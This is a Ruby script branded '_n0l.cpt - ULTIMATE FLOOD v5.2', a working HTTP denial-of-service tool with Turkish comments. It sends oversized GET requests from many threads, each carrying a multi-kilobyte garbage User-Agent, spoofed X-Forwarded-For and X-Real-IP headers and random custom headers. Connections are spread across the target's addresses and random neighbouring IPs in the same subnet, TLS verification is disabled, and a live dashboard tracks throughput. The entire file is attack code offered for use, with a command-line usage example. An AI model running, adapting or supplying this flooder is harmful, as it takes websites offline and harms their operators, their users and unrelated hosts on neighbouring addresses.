#!/usr/bin/env ruby
# encoding: UTF-8
# _n0l.cpt - ULTIMATE FLOOD v5.2 (Encoding Fixed)

require 'socket'
require 'openssl'
require 'thread'
require 'securerandom'
require 'uri'
require 'zlib'
require 'base64'
require 'timeout'

class N0L_CPT_ULTIMATE
  def initialize(target_url, thread_count=100)
    @target = parse_url(target_url)
    @threads = []
    @thread_count = thread_count
    @running = true
    @rate_limit_detected = false
    @mutex = Mutex.new
    @ping_time = measure_ping
    @stats = {
      requests: 0,
      errors: 0,
      bytes_sent: 0,
      start_time: Time.now,
      connections: 0,
      packets_sent: 0
    }

    @user_agent = generate_massive_user_agent
    @large_requests = Array.new(20) { generate_massive_request } # Daha az request önbelleği
    @request_index = 0
    @ip_pool = generate_ip_pool

    puts "[*] Generated #{@large_requests.size} massive requests"
    puts "[*] User-Agent size: #{@user_agent.bytesize / 1024}KB"
    puts "[*] IP Pool size: #{@ip_pool.size}"
  end

  def generate_massive_user_agent
    base = "Mozilla/5.0 (Linux; '>_ | _n0l.cpt ; +) AppleWebKit/537.36 (KHTML, like Gecko) PawxyBrowser/116.20.8 Console Safari/UNKNOWN"

    garbage = ""
    500.times do |i| # 1000'den 500'e düşürdüm
      case rand(4) # Basitleştirdim
      when 0
        # ASCII-only garbage
        garbage << (32..126).to_a.sample(rand(50..100)).pack('C*')
      when 1
        # Base64
        garbage << Base64.strict_encode64(SecureRandom.random_bytes(rand(50..150)))
      when 2
        # Hex data
        garbage << SecureRandom.hex(rand(25..75))
      else
        # Simple pattern
        garbage << "X" * rand(30..80)
      end
      garbage << "\\n" # Escaped newline
    end

    "#{base}\\n#{garbage}"
  end

  def generate_ip_pool
    ips = []

    begin
      ips = Socket.getaddrinfo(@target[:host], nil).map { |ai| ai[3] }.uniq
    rescue
      ips = [@target[:ip]]
    end

    # Sadece 10 IP ekle
    if @target[:ip] =~ /\d+\.\d+\.\d+\.\d+/
      base_ip = @target[:ip].split('.').map(&:to_i)
      0.upto(9).each do |i|
        new_ip = "#{base_ip[0]}.#{base_ip[1]}.#{base_ip[2]}.#{rand(1..254)}"
        ips << new_ip unless new_ip == @target[:ip]
      end
    end

    ips.uniq[0..19] # Max 20 IP
  end

  def parse_url(url)
    begin
      uri = URI(url)
      ip = begin
        Socket.getaddrinfo(uri.host, nil).first[3]
      rescue
        uri.host
      end

      {
        host: uri.host,
        port: uri.port || (uri.scheme == 'https' ? 443 : 80),
        path: uri.path.empty? ? '/' : uri.path,
        ssl: uri.scheme == 'https',
        ip: ip
      }
    rescue => e
      puts "[!] URL parse error: #{e.message}"
      host = url.gsub(/https?:\/\//, '').split('/').first
      {
        host: host,
        port: 443,
        path: '/',
        ssl: true,
        ip: host
      }
    end
  end

  def measure_ping
    puts "[*] Measuring ping to #{@target[:host]}..."

    begin
      Timeout.timeout(2) do
        start = Time.now
        socket = TCPSocket.new(@target[:ip], @target[:port])
        socket.close
        ping = ((Time.now - start) * 1000).round
        puts "[*] Ping: #{ping}ms"
        ping
      end
    rescue Timeout::Error
      puts "[*] Ping: TIMEOUT"
      "TIMEOUT"
    rescue => e
      puts "[*] Ping error: #{e.message}"
      "ERROR"
    end
  end

  def generate_massive_request
    # Daha basit, encoding-safe request
    params = []
    10.times do |i| # 50'den 10'a
      param_name = SecureRandom.alphanumeric(rand(5..10))
      # ASCII-only values
      param_value = (32..126).to_a.sample(rand(100..500)).pack('C*')
      params << "#{param_name}=#{param_value}"
    end

    param_string = params.join('&')
    path = "#{@target[:path]}?#{param_string}"

    headers = [
      "GET #{path} HTTP/1.1",
      "Host: #{@target[:host]}",
      "User-Agent: #{@user_agent}",
      "Accept: */*",
      "Accept-Language: en-US,en;q=0.9",
      "Accept-Encoding: gzip, deflate",
      "Connection: close",
      "Cache-Control: no-cache",
      "Pragma: no-cache",
      "X-Forwarded-For: #{rand(1..255)}.#{rand(0..255)}.#{rand(0..255)}.#{rand(0..255)}",
      "X-Real-IP: #{rand(1..255)}.#{rand(0..255)}.#{rand(0..255)}.#{rand(0..255)}"
    ]

    # Sadece 20 custom header
    20.times do
      header_name = "X-Custom-#{SecureRandom.alphanumeric(rand(3..8))}"
      header_value = SecureRandom.alphanumeric(rand(20..100))
      headers << "#{header_name}: #{header_value}"
    end

    headers.join("\r\n") + "\r\n\r\n"
  end

  def create_socket(ip)
    socket = Socket.new(Socket::AF_INET, Socket::SOCK_STREAM, 0)

    sockaddr = Socket.sockaddr_in(@target[:port], ip)

    begin
      socket.connect_nonblock(sockaddr)
    rescue IO::WaitWritable
      if IO.select(nil, [socket], nil, 1)
        begin
          socket.connect_nonblock(sockaddr)
        rescue Errno::EISCONN
        rescue
          socket.close
          raise
        end
      else
        socket.close
        raise "Connect timeout"
      end
    end

    if @target[:ssl]
      context = OpenSSL::SSL::SSLContext.new
      context.verify_mode = OpenSSL::SSL::VERIFY_NONE

      ssl_socket = OpenSSL::SSL::SSLSocket.new(socket, context)
      ssl_socket.sync_close = true
      ssl_socket.hostname = @target[:host]

      begin
        ssl_socket.connect_nonblock
      rescue IO::WaitReadable
        IO.select([ssl_socket])
        retry
      rescue IO::WaitWritable
        IO.select(nil, [ssl_socket])
        retry
      end

      return ssl_socket
    end

    socket
  end

  def get_next_ip
    @mutex.synchronize do
      @ip_pool.sample
    end
  end

  def get_next_request
    @mutex.synchronize do
      req = @large_requests[@request_index]
      @request_index = (@request_index + 1) % @large_requests.size
      req
    end
  end

  def send_request(socket)
    request = get_next_request

    begin
      bytes_sent = socket.write(request)

      @mutex.synchronize do
        @stats[:requests] += 1
        @stats[:bytes_sent] += bytes_sent
        @stats[:packets_sent] += (bytes_sent / 1500.0).ceil
      end

      return true

    rescue => e
      @mutex.synchronize { @stats[:errors] += 1 }
      return false
    end
  end

  def worker_thread(id)
    while @running && !@rate_limit_detected
      begin
        ip = get_next_ip
        socket = create_socket(ip)

        @mutex.synchronize { @stats[:connections] += 1 }

        send_request(socket)

        socket.close

        sleep(rand(0.001..0.01))

      rescue => e
        @mutex.synchronize { @stats[:errors] += 1 }
        sleep(0.1)
      end
    end
  end

  def display_stats
    last_requests = 0
    last_bytes = 0
    last_time = Time.now

    while @running
      sleep(1)

      @mutex.synchronize do
        now = Time.now
        elapsed = now - @stats[:start_time]
        time_diff = now - last_time

        if time_diff > 0
          current_rps = (@stats[:requests] - last_requests) / time_diff
          current_kbps = ((@stats[:bytes_sent] - last_bytes) * 8 / time_diff / 1000).round(2)

          last_requests = @stats[:requests]
          last_bytes = @stats[:bytes_sent]
          last_time = now

          system("clear") || system("cls")

          puts "┌────────────────────────────────────────────────────────────┐"
          puts "│                 _n0l.cpt - ULTIMATE FLOOD                  │"
          puts "├────────────────────────────────────────────────────────────┤"
          puts "│ Target: #{@target[:host].ljust(50)}│"
          puts "│ IPs: #{@ip_pool.size.to_s.ljust(3)} Port: #{@target[:port].to_s.ljust(4)} SSL: #{@target[:ssl] ? 'YES' : 'NO'} │"
          puts "├────────────────────────────────────────────────────────────┤"
          puts "│ |{ tps : #{current_rps.round.to_s.ljust(8)} }                             │"
          puts "│ |{ ms : #{@ping_time.to_s.ljust(6)}ms }                            │"
          puts "│ |{ send : #{(@stats[:bytes_sent] / 1024.0 / 1024.0).round(2).to_s.ljust(6)} MB }                           │"
          puts "├────────────────────────────────────────────────────────────┤"
          puts "│ Requests: #{@stats[:requests].to_s.ljust(10)} Errors: #{@stats[:errors].to_s.ljust(10)} │"
          puts "│ Connections: #{@stats[:connections].to_s.ljust(8)} RPS: #{(@stats[:requests] / elapsed).round.to_s.ljust(8)} │"
          puts "│ KB/s: #{current_kbps.round.to_s.ljust(10)} Threads: #{@thread_count.to_s.ljust(8)} │"
          puts "│ Status: #{@running ? 'ACTIVE' : 'STOPPED'} Rate Limit: #{@rate_limit_detected ? 'YES' : 'NO'} │"
          puts "└────────────────────────────────────────────────────────────┘"
          puts " Duration: #{elapsed.round(1)}s | Press CTRL+C to stop"
        end
      end
    end
  end

  def start
    puts "[*] _n0l.cpt - Ultimate Flood v5.2"
    puts "[*] Target: #{@target[:host]}"
    puts "[*] Protocol: #{@target[:ssl] ? 'HTTPS' : 'HTTP'}"
    puts "[*] Port: #{@target[:port]}"
    puts "[*] Threads: #{@thread_count}"
    puts "[*] Request Size: ~#{@large_requests.first.bytesize / 1024}KB"
    puts

    stats_thread = Thread.new { display_stats }

    @thread_count.times do |i|
      @threads << Thread.new(i) { |id| worker_thread(id) }
      sleep(0.01)
    end

    Signal.trap("INT") do
      puts "\n[*] Stopping..."
      @running = false
    end

    begin
      @threads.each(&:join)
    rescue Interrupt
      @running = false
    end

    stats_thread.kill if stats_thread.alive?

    elapsed = Time.now - @stats[:start_time]

    puts "\n" + "="*60
    puts "RESULTS"
    puts "="*60
    puts "Duration:      #{elapsed.round(2)}s"
    puts "Requests:      #{@stats[:requests]}"
    puts "Errors:        #{@stats[:errors]}"
    puts "Data Sent:     #{(@stats[:bytes_sent] / 1024.0 / 1024.0).round(2)} MB"
    puts "Avg RPS:       #{(@stats[:requests] / elapsed).round(1)}/s"
    puts "Rate Limit:    #{@rate_limit_detected ? 'YES' : 'NO'}"
    puts "="*60
  end
end

# Ana program
if __FILE__ == $PROGRAM_NAME
  if ARGV.empty?
    puts "Usage: ruby #{$0} <url> [threads]"
    puts "Example: ruby #{$0} https://example.com/ 50"
    exit 1
  end

  url = ARGV[0]
  threads = ARGV[1] ? ARGV[1].to_i : 50

  unless url.start_with?('http://', 'https://')
    url = "http://#{url}"
  end

  begin
    attack = N0L_CPT_ULTIMATE.new(url, threads)
    attack.start
  rescue Interrupt
    puts "\n[*] Stopped"
  rescue => e
    puts "[!] Error: #{e.message}"
    puts "[!] Backtrace:" if ARGV.include?('--debug')
    puts e.backtrace if ARGV.include?('--debug')
  end
end
